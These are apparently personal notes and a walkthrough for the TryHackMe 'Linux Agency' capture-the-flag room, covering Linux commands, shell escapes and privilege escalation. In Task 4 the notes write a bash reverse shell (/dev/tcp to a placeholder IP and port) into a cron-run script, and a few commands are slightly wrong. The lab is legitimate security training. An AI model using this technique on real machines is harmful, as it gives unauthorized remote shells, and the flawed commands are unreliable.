---
tags:
  - grep
  - chmod
  - su
  - encode
  - decode
  - hashing
  - base64
  - RevShell
  - tools
  - cyber_chef
  - ltrace
---
# Linux Agency

***NOTE***: this room need to be done by some knowledge in [This room ](LinuxRoom-1.md)
link : https://tryhackme.com/r/room/linuxagency
writ up: https://waqar-arain.netlify.app/tryhackme/linux-agency/

---

## Task 1, task 2

***Deploy and ssh***

---
# Task 3

- It was better to search in the whole system with `grep` for the word
  ```bash
	  #the -r flag is for searching in folders for files 
	  grep -r `word` /*
	```
- to get as a `super user account of every mission`
  ```bash
	su mission1
	```  
- it's okay from time to time to check the text by `nano` not `cat`
	- to hide something in a file from printing you can add `^M` at the end of it to make it hidden
- **(Mission 11)** With EV's he meant environment variables!!!!!
	- so the solution is to search inside the env variable !!!!
	  ```bash
		  # and the -i flag for the case sensitivity
		  env | grep -i flag
		```
- **(Mission 12)** if the file has no permission you can not access it untill you change it
	- How to change the permission?
	  ```bash
			chmod +r flag.txt
		```
- ***(Mission 14,15,16)*** Use [Cyber Chef👨‍🍳](https://gchq.github.io/CyberChef/) to solve them.
- ***Tools*** [RevShell](https://www.revshells.com/)
- ***(Mission 16)*** it was a fucking compiled sh file just run the damn script!!! -it was a note screaming at myself-
- ***(Mission 17,18,19,20)*** use the right compiler to run the language
- ***(Mission 21)*** he spawned you into an `/bin/sh` try to get back to `/bin/bash`
- ***(Mission 22)*** he spawned you into a python interpreter try to open the `/bin/bash` form it
	- there is a library in python called `pty` that generate terminal with a command you want
	  ```python
		import pty;pty.spawn("/bin/bash")
		```
- ***(Mission 23)*** there was a site hosted in the machine you could know it by seeing the content of `/etc/hosts` and the ***hosts*** file is mentioned in the [Ch3 ](../Linux_basics_for_Hackers_book/ANALYZING_AND_MANAGING_NETWORKS.md)in the LBFH book.
	- to view the site on the server you can use `wget`
	  ```bash
	  wget localhost
		```
- ***(Mission 24)*** there is an important command `ltrace` that traces the libraries called to execute a code or a command, so you can use it to trace what that sh file does in the background and look at the variables it is dealing with ad look at the functions it is using.
- ***(Mission 25)*** you can't use `ls` so enter any char and take a space and hit double tabs and it will show you the files in the directory, to print the content of `flag.txt` we need something other than the `cat` command, lucky us that we have `printf` that acts like the echo command, next we need some expressions to extract the content from the file
  ```bash
  printf %s $(<flag.txt) 
	```
	Lets breakthrough this code:
	- `   printf`: This is a command used to format and print data. It takes a format string followed by arguments to fill in the placeholders in the format string.
    
	- `%s`: This is a format specifier used with `printf` to indicate that the corresponding argument should be treated as a string.
    
	- `$(<flag.txt)`: This part of the command is a command substitution. It reads the contents of the file named `flag.txt` and substitutes it as an argument to `printf`.
		- the `<` means to read the content of the flag
		- `$(....)` it is an expression  that executes whatever is between those brackets as a command, so if it is a text or a number it will return it, if it is command it will run it.
	Last thing, The damn `su` is not working because he cleared the fucking PATH variable!, to make it enter this command that adds the su command to the PATH like normal
	```bash
	export PATH=/bin:/usr/bin/su
	```
	and that should make the `su` works
- ***(Mission 26)*** there is a command named `file` to check the details of a file use it
- ***(Mission 27)*** act like it is a `gz` compressed file that contains a regular file
- ***(Mission 28)*** you are spawned in a ruby interpreter
  1. to exit from it: `exec '/bin/bash'`
  2. to print a text file reversed use the command `rev`
- ***(viktor Mission)*** you can get the logs of the git by 
  ```bash
	git log
	```

# Task 4

#### Diana's flag

*Well this flag is related to a scheduled process of it happens it executes an `sh` file that you have a read and write permissions on, so the way to get this flag is to put a `bash` reverse shell script in that file and listen till it runs and you get to the shell that has the flag.*
- [Bash Rev-shell scripts](https://gtfobins.github.io/gtfobins/bash/)

So, the **first** thing is to find where the script is, there are two ways:

##### The hard and luck based way 

lets search for it by the `find` command by searching for all the files that `Viktor` owns, and the `47.sh` is the target file.

```bash
find / -user viktor 2>dev/null | grep .sh
```

Now lets put the `bash` reverse shell script in the file, which you can get from: [GTFobins](https://gtfobins.github.io/gtfobins/bash/)

```bash
echo "bash -c 'exec bash -i &>/dev/tcp/{IP}/{port} <&1'" > /opt/scripts/47.sh
```

And wait till the scheduled process runs the script file.  
